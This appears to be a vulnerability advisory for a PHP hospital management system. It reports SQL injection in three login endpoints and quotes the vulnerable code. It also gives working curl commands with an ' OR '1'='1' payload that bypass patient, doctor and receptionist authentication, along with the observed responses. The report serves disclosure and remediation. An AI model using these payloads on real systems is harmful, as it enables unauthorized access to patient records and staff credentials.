### Title

SQL injection in `func.php`, `func1.php`, and `func3.php` authentication bypasses all logins

### Summary

All three authentication endpoints (`func.php` patient login, `func1.php` doctor login, `func3.php` admin login) concatenate `$_POST` fields into raw SQL strings. An unauthenticated attacker can bypass each login with a boolean SQL injection payload and obtain a valid session for the first row of the corresponding table (`patreg`, `doctb`, `admintb`). Patient, doctor, and receptionist dashboards all become reachable without supplying a real password.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

SQL Injection (CWE-89)

### Affected Code

File: `func.php`

```php
$email=$_POST['email'];
$password=$_POST['password2'];
$query="select * from patreg where email='$email' and password='$password';";
$result=mysqli_query($con,$query);
if(mysqli_num_rows($result)==1)
{
    while($row=mysqli_fetch_array($result,MYSQLI_ASSOC)){
      $_SESSION['pid'] = $row['pid'];
      ...
    }
    header("Location:admin-panel.php");
}
```

File: `func1.php`

```php
$dname=$_POST['username3'];
$dpass=$_POST['password3'];
$query="select * from doctb where username='$dname' and password='$dpass';";
$result=mysqli_query($con,$query);
if(mysqli_num_rows($result)==1)
{
    while($row=mysqli_fetch_array($result,MYSQLI_ASSOC)){
        $_SESSION['dname']=$row['username'];
    }
    header("Location:doctor-panel.php");
}
```

File: `func3.php`

```php
$username=$_POST['username1'];
$password=$_POST['password2'];
$query="select * from admintb where username='$username' and password='$password';";
$result=mysqli_query($con,$query);
if(mysqli_num_rows($result)==1)
{
    $_SESSION['username']=$username;
    header("Location:admin-panel1.php");
}
```

### Root Cause

All three endpoints use string concatenation instead of parameterised queries. `$_POST['email']`, `$_POST['password2']`, `$_POST['username3']`, `$_POST['password3']`, and `$_POST['username1']` are placed directly inside single-quoted SQL literals. Because `mysqli_query()` does not perform any binding, the attacker controls the SQL grammar. The `WHERE email='$email' and password='$password'` predicate is reduced to a tautology and `mysqli_num_rows($result)==1` becomes true.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Bypass the patient login (uses `patreg`). A wrong password is rejected.

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=ram@gmail.com" \
  --data-urlencode "password2=wrong-password"
```

Expected response (unauthenticated):

```text
HTTP/1.1 200 OK
...
<script>alert('Invalid Username or Password. Try Again!');
          window.location.href = 'index1.php';</script>
```

3. Bypass the patient login with SQL injection.

```bash
curl -sS -i "$BASE_URL/func.php" \
  --data-urlencode "patsub=1" \
  --data-urlencode "email=' OR '1'='1' -- -" \
  --data-urlencode "password2=anything"
```

Observed response:

```text
HTTP/1.1 302 Found
Location: admin-panel.php
Set-Cookie: PHPSESSID=lnvvn1riclaqhon9mp5182au33; path=/
```

The 302 redirect to `admin-panel.php` indicates the patient dashboard has been reached without supplying a real password. The first row of `patreg` (pid=1, "Ram Kumar") is loaded into the session.

4. Bypass the doctor login (uses `doctb`).

```bash
curl -sS -i "$BASE_URL/func1.php" \
  --data-urlencode "docsub1=1" \
  --data-urlencode "username3=' OR '1'='1' -- -" \
  --data-urlencode "password3=anything"
```

Observed response:

```text
HTTP/1.1 302 Found
Location: doctor-panel.php
```

5. Bypass the receptionist/admin login (uses `admintb`).

```bash
curl -sS -i "$BASE_URL/func3.php" \
  --data-urlencode "adsub=1" \
  --data-urlencode "username1=' OR '1'='1' -- -" \
  --data-urlencode "password2=anything"
```

Observed response:

```text
HTTP/1.1 302 Found
Location: admin-panel1.php
```

6. Follow the redirect using the captured `PHPSESSID` cookie to confirm full dashboard access (the receptionist dashboard exposes the doctor table including plaintext passwords).

```bash
curl -sS -b 'PHPSESSID=<captured_session>' "$BASE_URL/admin-panel1.php" \
  | grep -E "ashok|arun|Dinesh"
```

### Impact

An unauthenticated attacker can log in as a patient, doctor, or receptionist. Patient accounts expose the ability to book appointments and read prescription data; doctor accounts expose all appointments and prescriptions; the receptionist account exposes the full doctor table (including plaintext passwords) and can add or delete doctors. Combined with stored XSS in `contact.php`/`prescribe.php`, the receptionist session is sufficient to obtain code execution in other users' browsers. Because the same SQL injection primitive is available on every authentication endpoint, an attacker can also extract database contents via UNION-based payloads (the SELECT result is iterated into `$_SESSION` and used to render tables).

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Score: 9.1 (Critical)
```
